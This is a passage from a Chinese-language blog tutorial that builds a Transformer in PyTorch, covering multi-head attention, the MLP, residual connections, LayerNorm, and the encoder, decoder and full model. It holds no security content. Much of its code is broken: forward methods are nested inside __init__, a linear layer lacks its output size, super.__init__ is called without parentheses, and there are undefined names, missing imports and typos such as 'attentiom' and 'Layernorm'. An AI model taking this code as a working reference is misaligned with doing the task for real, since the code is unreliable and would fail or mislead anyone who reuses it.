class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 多头注意力机制</span><br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> torch<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiHeadAttention</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args:ModelArgs,is_causal=<span class="hljs-literal">False</span></span>):<br>        <span class="hljs-comment"># 构造函数</span><br>        <span class="hljs-comment"># args: 配置对象</span><br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-comment"># 隐藏层维度必须是头数的整数倍，因为后面我们会将输入拆成头数个矩阵</span><br>        <span class="hljs-keyword">assert</span> args.dim % args.n_heads == <span class="hljs-number">0</span><br>        <span class="hljs-comment"># 每个头的维度，等于模型维度除以头的总数。</span><br>        <span class="hljs-variable language_">self</span>.head_dim = args.dim // args.n_heads<br>        <span class="hljs-variable language_">self</span>.n_heads = args.n_heads<br><br>        <span class="hljs-comment"># Wq, Wk, Wv 参数矩阵，每个参数矩阵为 n_embd x dim</span><br>        <span class="hljs-comment"># 这里通过三个组合矩阵来代替了n个参数矩阵的组合，其逻辑在于矩阵内积再拼接其实等同于拼接矩阵再内积，</span><br>        <span class="hljs-comment"># 不理解的读者可以自行模拟一下，每一个线性层其实相当于n个参数矩阵的拼接</span><br><br>        <span class="hljs-variable language_">self</span>.wq = nn.Linear(args.n_embd, <span class="hljs-variable language_">self</span>.n_heads * <span class="hljs-variable language_">self</span>.head_dim, bias=<span class="hljs-literal">False</span>)<br>        <span class="hljs-variable language_">self</span>.wk = nn.Linear(args.n_embd, <span class="hljs-variable language_">self</span>.n_heads * <span class="hljs-variable language_">self</span>.head_dim, bias=<span class="hljs-literal">False</span>)<br>        <span class="hljs-variable language_">self</span>.wv = nn.Linear(args.n_embd, <span class="hljs-variable language_">self</span>.n_heads * <span class="hljs-variable language_">self</span>.head_dim, bias=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># 输出权重矩阵，维度为 dim x dim（head_dim = dim / n_heads）</span><br>        <span class="hljs-variable language_">self</span>.wo = nn.Linear(<span class="hljs-variable language_">self</span>.n_heads * <span class="hljs-variable language_">self</span>.head_dim, bias = <span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># 注意力的 dropout</span><br>        <span class="hljs-variable language_">self</span>.attn_dropout = nn.Dropout(args.dropout)<br><br>        <span class="hljs-comment"># 残差连接的 dropout</span><br>        <span class="hljs-variable language_">self</span>.resid_dropout = nn.Dropout(args.dropout)<br><br>        <span class="hljs-variable language_">self</span>.is_causal = is_causal<br><br>        <span class="hljs-comment"># 创建一个上三角矩阵，用于遮蔽未来信息</span><br>        <span class="hljs-comment"># 注意，因为是多头注意力，Mask 矩阵比之前我们定义的多一个维度</span><br><br>        <span class="hljs-keyword">if</span> is_causal:<br>            mask = torch.full((<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,args.max_seq_len,args.max_seq_len),<span class="hljs-built_in">float</span>(<span class="hljs-string">&quot;-inf&quot;</span>))<br>            mask = torch.triu(mask,diagonal=<span class="hljs-number">1</span>)<br>            <br>            <span class="hljs-comment"># 注册为模型的缓冲区</span><br>            <span class="hljs-variable language_">self</span>.register_buffer(<span class="hljs-string">&quot;mask&quot;</span>,mask)<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,q:torch.Tensor,k:torch.Tensor,v:torch.Tensor</span>):<br>            <span class="hljs-comment"># 获取批次大小和序列长度，[batch_size, seq_len, dim]</span><br>            bsz, seqlen, _ = q.shape<br>            <br>            <span class="hljs-comment"># 计算查询（Q）、键（K）、值（V）,输入通过参数矩阵层，维度为 (B, T, n_embed) x (n_embed, dim) -&gt; (B, T, dim)</span><br>            xq,xk,xv = <span class="hljs-variable language_">self</span>.wq(q),<span class="hljs-variable language_">self</span>.wk(k),<span class="hljs-variable language_">self</span>.wv(v)<br>        <br>        <span class="hljs-comment"># 将 Q、K、V 拆分成多头，维度为 (B, T, n_head, dim // n_head)，然后交换维度，变成 (B, n_head, T, dim // n_head)</span><br>        <span class="hljs-comment"># 因为在注意力计算中我们是取了后两个维度参与计算</span><br>        <span class="hljs-comment"># 为什么要先按B*T*n_head*C//n_head展开再互换1、2维度而不是直接按注意力输入展开，是因为view的展开方式是直接把输入全部排开，</span><br>        <span class="hljs-comment"># 然后按要求构造，可以发现只有上述操作能够实现我们将每个头对应部分取出来的目标</span><br><br>            xq = xq.view(bsz,seqlen,<span class="hljs-variable language_">self</span>.n_heads,<span class="hljs-variable language_">self</span>.head_dim)<br>            xk = xk.view(bsz,seqlen,<span class="hljs-variable language_">self</span>.n_heads,<span class="hljs-variable language_">self</span>.head_dim)<br>            xv = xv.view(bsz,seqlen,<span class="hljs-variable language_">self</span>.n_heads,<span class="hljs-variable language_">self</span>.head_dim)<br><br>            xq = xq.transpose(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>            xk = xk.transpose(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>            xv = xv.transpose(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>            <span class="hljs-comment"># 注意力计算</span><br>        <span class="hljs-comment"># 计算 QK^T / sqrt(d_k)，维度为 (B, nh, T, hs) x (B, nh, hs, T) -&gt; (B, nh, T, T)</span><br>            scores = torch.matmul(xq,xk.transpose(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)) / math.sqrt(<span class="hljs-variable language_">self</span>.head_dim)<br>            <span class="hljs-comment"># 掩码自注意力必须有注意力掩码</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.is_causal:<br>                <span class="hljs-keyword">assert</span> <span class="hljs-built_in">hasattr</span>(<span class="hljs-variable language_">self</span>,<span class="hljs-string">&#x27;mask&#x27;</span>)<br><br>                <span class="hljs-comment"># 这里截取到序列长度，因为有些序列可能比 max_seq_len 短</span><br>                scores = scores + <span class="hljs-variable language_">self</span>.mask[:,:,:seqlen,:seqlen]<br><br>            <span class="hljs-comment"># 计算 softmax，维度为 (B, nh, T, T)</span><br>            scores = F.softmax(scores.<span class="hljs-built_in">float</span>(),dim=-<span class="hljs-number">1</span>).type_as(xq)<br>            <span class="hljs-comment"># 做 Dropout</span><br>            scores = <span class="hljs-variable language_">self</span>.attn_dropout(scores)<br>            <span class="hljs-comment"># V * Score，维度为(B, nh, T, T) x (B, nh, T, hs) -&gt; (B, nh, T, hs)</span><br>            output = torch.matmul(scores,xv)<br><br>            <span class="hljs-comment"># 恢复时间维度并合并头。</span><br>        <span class="hljs-comment"># 将多头的结果拼接起来, 先交换维度为 (B, T, n_head, dim // n_head)，再拼接成 (B, T, n_head * dim // n_head)</span><br>        <span class="hljs-comment"># contiguous 函数用于重新开辟一块新内存存储，因为Pytorch设置先transpose再view会报错，</span><br>        <span class="hljs-comment"># 因为view直接基于底层存储得到，然而transpose并不会改变底层存储，因此需要额外存储</span><br>            output = output.transpose(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>).contiguous().view(bsz,seqlen,-<span class="hljs-number">1</span>)<br><br>            <span class="hljs-comment"># 最终投影回残差流。</span><br>            output = <span class="hljs-variable language_">self</span>.wo(output)<br>            output = <span class="hljs-variable language_">self</span>.resid_dropout(output)<br><br>            <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><p>此时通过<code>attention</code>我们得到了包含语义，位置，上下文信息的token向量表示，但是不管多复杂，这些都是<code>线性</code>的，不能做复杂的<strong>非线性特征提取</strong>，因此需要加入一层<code>FNN</code>(前馈神经网络)，引入非线性(激活函数)，增强模型表达能力，类似于传统<code>MLP</code></p><p>代码实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 前馈神经网络 FNN</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MLP</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>()<br>        <span class="hljs-built_in">super</span>.__init__()<br>        <span class="hljs-comment"># 定义第一层线性变换，从输入维度到隐藏维度</span><br>        <span class="hljs-variable language_">self</span>.w1 = nn.Linear(dim,hidden_dim,bias=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># 定义第二层线性变换，从隐藏维度到输入维度</span><br>        <span class="hljs-variable language_">self</span>.w2 = nn.Linear(hidden_dim,dim,bias=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># 定义dropout层，用于防止过拟合</span><br>        <span class="hljs-variable language_">self</span>.dropout = nn.Dropout(dropout)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        <span class="hljs-comment"># 前向传播函数</span><br>        <span class="hljs-comment"># 首先，输入x通过第一层线性变换和RELU激活函数</span><br>        <span class="hljs-comment"># 最后，通过第二层线性变换和dropout层</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.dropout(<span class="hljs-variable language_">self</span>.w2(F.relu(<span class="hljs-variable language_">self</span>.w1(x))))<br></code></pre></td></tr></table></figure><p>随着神经网络层数的不断叠加，在反向传播的过程中，根据<strong>链式法则</strong>，梯度会不断与各层的导数相乘。当这些导数的模长期<code>大于 1</code>或<code>小于 1</code>时，梯度便会呈指数级增长或衰减，从而分别引发<strong>梯度爆炸</strong>或<strong>梯度消失</strong>问题，使得深层网络难以稳定训练，而<code>add&amp;norm</code>就是在解决这个问题</p><p>其中，<code>add</code>代表<strong>残差连接</strong>(residual connection)</p><p><code>y = x + Sublayer(x)</code></p><p>在反向传播时，即使子层本身的梯度很小或很大，梯度仍然可以通过残差路径(<strong>Sublayer</strong>)直接传递，从而有效缓解梯度消失和梯度爆炸的问题，并使深层网络更容易优化，毕竟x的导数永远是1，使得梯度在传播过程中至少保留一条不发生缩放的通路！</p><p>从数学角度看，设L为损失函数：</p><p><img src="/images/53.png" alt="如图"></p><p>即使子层的梯度趋近于0，梯度仍然可以通过恒等映射项1直接回传，从而避免梯度完全消失；而当子层梯度过大时，残差结构也能在一定程度上缓冲梯度的剧烈变化，使训练过程更加稳定，这也是ai发展中里程碑式的一层！</p><p>稍微有点抽象，可以多理解理解…</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 残差连接 resnet residual connection 防止深层网络叠加下的梯度消失/梯度爆炸</span><br>h = x + <span class="hljs-variable language_">self</span>.attentiom.forward(<span class="hljs-variable language_">self</span>.attention_norm(x))<br><br>out = h + <span class="hljs-variable language_">self</span>.feed_forward.forward(<span class="hljs-variable language_">self</span>.fnn_norm(h))<br></code></pre></td></tr></table></figure><p>而<code>norm</code>通常采用<code>layer norm</code>(<code>batch norm</code>我不会，不讲了！)</p><p>对每个token的特征维度进行<strong>归一化处理</strong>，使其均值为0，方差为1，稳定各层的激活分布，防止数值随着层数加深而漂移，提高训练过程的稳定性和收敛速度</p><p><img src="/images/52.png" alt="如图"></p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 层归一化(layer norm)</span><br><span class="hljs-comment"># 批归一化(batch norm)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LayerNorm</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,features,eps=<span class="hljs-number">1e-6</span></span>):<br>        <span class="hljs-built_in">super</span>.__init__()<br><br>        <span class="hljs-comment"># 线性矩阵做映射</span><br>        <span class="hljs-variable language_">self</span>.a_2 = nn.Parameter(torch.ones(features))<br><br>        <span class="hljs-variable language_">self</span>.b_2 = nn.Parameter(torch.zeros(features))<br>        <span class="hljs-variable language_">self</span>.eps = eps<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br><br>            <span class="hljs-comment"># 在统计每个样本所有维度的值，求均值和方差</span><br>            mean = x.mean(-<span class="hljs-number">1</span>,keepdim=<span class="hljs-literal">True</span>) <span class="hljs-comment"># mean: [bsz, max_len, 1]</span><br>            std = x.std(-<span class="hljs-number">1</span>,keepdim=<span class="hljs-literal">True</span>) <span class="hljs-comment"># std: [bsz, max_len, 1]</span><br><br>            <span class="hljs-comment"># 注意这里也在最后一个维度发生了广播</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.a_2 * (x-mean) / (std+<span class="hljs-variable language_">self</span>.eps) + <span class="hljs-variable language_">self</span>.b_2<br></code></pre></td></tr></table></figure><p>将这些串联起来，我们就能写出encoder layer和decoder layer了，而n个这样的layer便组成了完整的encoder和decoder！</p><p>代码如下，需要注意一些细节，自己注意一下吧，毕竟，<code>attention is all you need!</code>…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoder</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EncoderLayer</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>.__init__()<br>        <span class="hljs-comment"># 一个 Layer 中有两个 LayerNorm，分别在 Attention 之前和 MLP 之前</span><br>        <span class="hljs-variable language_">self</span>.attention_norm = Layernorm(args.n_embd)<br>        <span class="hljs-comment"># Encoder 不需要掩码，传入 is_causal=False</span><br>        <span class="hljs-variable language_">self</span>.attention = MultiHeadAttention(args,is_causal=<span class="hljs-literal">False</span>)<br>        <span class="hljs-variable language_">self</span>.fnn_norm = LayerNorm(args,n_embd)<br>        <span class="hljs-variable language_">self</span>.feed_forward = MLP(args.dim,args.dim,dropout)<br><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        <span class="hljs-comment"># Layer Norm</span><br>        norm_x = <span class="hljs-variable language_">self</span>.attention_norm(x)<br>        <span class="hljs-comment"># 自注意力</span><br>        h = x + <span class="hljs-variable language_">self</span>.attention_forward(norm_x,norm_x,norm_x)<br>        <span class="hljs-comment"># 经过前馈神经网络</span><br>        out = h + <span class="hljs-variable language_">self</span>.feed_forward.forward(<span class="hljs-variable language_">self</span>.fnn_norm(h))<br><br>        <span class="hljs-keyword">return</span> out<br>    <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Encoder</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>(Encoder,<span class="hljs-variable language_">self</span>).__init__()<br><br>        <span class="hljs-comment"># 一个 Encoder 由 N 个 Encoder Layer 组成</span><br>        <span class="hljs-variable language_">self</span>.layers = nn.ModuleList([EncoderLayer(args) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.n_layer)])<br>        <span class="hljs-variable language_">self</span>.norm = LayerNorm(args.n_embd)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.layers:<br>            x = layer(x)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.norm(x)<br>    <br><br><span class="hljs-comment"># decoder</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DecoderLayer</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-comment"># 一个 Layer 中有三个 LayerNorm，分别在 Mask Attention 之前、Self Attention 之前和 MLP 之前</span><br><br>        <span class="hljs-variable language_">self</span>.attention_norm_1 = LayerNorm(args.n_embd)<br>        <span class="hljs-comment"># Decoder 的第一个部分是 Mask Attention，传入 is_causal=True</span><br>        <span class="hljs-variable language_">self</span>.mask_attention = MultiHeadAttention(args,is_causal=<span class="hljs-literal">True</span>)<br>        <span class="hljs-variable language_">self</span>.attention_norm_2 = LayerNorm(args.n_embd)<br>        <span class="hljs-comment"># Decoder 的第二个部分是 类似于 Encoder 的 Attention，传入 is_causal=False</span><br><br>        <span class="hljs-variable language_">self</span>.attention = MultiHeadAttention(args,is_causal=<span class="hljs-literal">False</span>)<br><br>        <span class="hljs-variable language_">self</span>.fnn_norm = LayerNorm(args.n_embd)<br><br>        <span class="hljs-comment"># 第三个部分是 MLP</span><br>        <span class="hljs-variable language_">self</span>.feed_forward = MLP(args.dim,args.dim,dropout)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x,enc_out</span>):<br>        <span class="hljs-comment"># Layer Norm</span><br>        norm_x = <span class="hljs-variable language_">self</span>.attention_norm_1(x)<br><br>        <span class="hljs-comment"># 掩码自注意力</span><br>        x = x + <span class="hljs-variable language_">self</span>.mask_attention.forward(norm_x,norm_x,norm_x)<br><br>        <span class="hljs-comment"># 多头注意力</span><br>        norm_x = <span class="hljs-variable language_">self</span>.attention_norm_2(x)<br>        h = x + <span class="hljs-variable language_">self</span>.attention.forward(norm_x,enc_out,enc_out)<br><br>        <span class="hljs-comment"># 经过前馈神经网络</span><br>        out = h + <span class="hljs-variable language_">self</span>.feed_forward.forward(<span class="hljs-variable language_">self</span>.fnn_norm(h))<br><br>        <span class="hljs-keyword">return</span> out<br>    <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Decoder</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>(Decoder,<span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-comment"># 一个 Decoder 由 N 个 Decoder Layer 组成</span><br><br>        <span class="hljs-variable language_">self</span>.layers = nn.ModuleList([DecoderLayer(args) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.n_layer)])<br>        <span class="hljs-variable language_">self</span>.norm = LayerNorm(args.n_embd)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x,enc_out</span>):<br>        <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.layers:<br>            x = layer(x,enc_out)<br><br>        <span class="hljs-keyword">return</span>  <span class="hljs-variable language_">self</span>.norm(x)<br></code></pre></td></tr></table></figure><p>最后把所有的都结合起来，合成我们的transformer！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 完整 transformer 模型</span><br><span class="hljs-comment"># combination</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transformer</span>(nn.Module):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;整体模型&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-comment"># 必须输入词表大小和 block size</span><br>        <span class="hljs-keyword">assert</span> args.vocab_size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">assert</span> args.block_size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.args = args<br>        <span class="hljs-variable language_">self</span>.transformer = nn.ModuleDict(<span class="hljs-built_in">dict</span>(<br>            wte = nn.Embedding(args.vocab_size,args.n_embd),<br>            wpe = PositionEncoding(args),<br>            drop = nn.Dropout(args.dropout),<br>            encoder = Encoder(args),<br>            decoder = Decoder(args),<br>        ))<br>        <span class="hljs-comment"># 最后的线性层，输入是 n_embd，输出是词表大小</span><br>        <span class="hljs-variable language_">self</span>.lm_head = nn.Linear(args.n_embd,args.vocab_size,bias=<span class="hljs-literal">False</span>)<br><br>        <span class="hljs-comment"># 初始化所有的权重</span><br>        <span class="hljs-variable language_">self</span>.apply(<span class="hljs-variable language_">self</span>._init_weights)<br><br>        <span class="hljs-comment"># 查看所有参数的数量</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;number of parameters: %.2fM&quot;</span> % (<span class="hljs-variable language_">self</span>.get_num_params()/<span class="hljs-number">1e6</span>,))<br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;统计所有参数的数量&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_num_params</span>(<span class="hljs-params">self,non_embedding=<span class="hljs-literal">False</span></span>):<br>        <span class="hljs-comment"># non_embedding: 是否统计 embedding 的参数</span><br>        n_params = <span class="hljs-built_in">sum</span>(p.numel() <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.parameters())<br><br>        <span class="hljs-comment"># 如果不统计 embedding 的参数，就减去</span><br>        <span class="hljs-keyword">if</span> non_embedding:<br>            n_params -= <span class="hljs-variable language_">self</span>.transformer.wte.weight.numel()<br>        <span class="hljs-keyword">return</span> n_params<br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;初始化权重&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_init_weights</span>(<span class="hljs-params">self,module</span>):<br>        <span class="hljs-comment"># 线性层和 Embedding 层初始化为正则分布</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(module,nn.Linear):<br>            torch.nn.init.normal_(module.weight,mean=<span class="hljs-number">0.0</span>,std=<span class="hljs-number">0.02</span>)<br>            <span class="hljs-keyword">if</span> module.bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                torch.nn.init.zeros_(module.bias)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(module,nn.Embedding):<br>            torch.nn.init.normal_(module.weight,mean=<span class="hljs-number">0.0</span>,std=<span class="hljs-number">0.02</span>)<br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;前向计算函数&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,idx,targets=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-comment"># 输入为 idx，维度为 (batch size, sequence length, 1)；targets 为目标序列，用于计算 loss</span><br>        device = idx.device<br>        b,t = idx.size()<br>        <span class="hljs-keyword">assert</span> t &lt;= <span class="hljs-variable language_">self</span>.args.block_size, <span class="hljs-string">f&quot;不能计算该序列，该序列长度为<span class="hljs-subst">&#123;t&#125;</span>，最大序列长度只有<span class="hljs-subst">&#123;self.args.block_size&#125;</span>&quot;</span><br><br>        <span class="hljs-comment"># 通过 self.transformer</span><br>        <span class="hljs-comment"># 首先将输入 idx 通过 Embedding 层，得到维度为 (batch size, 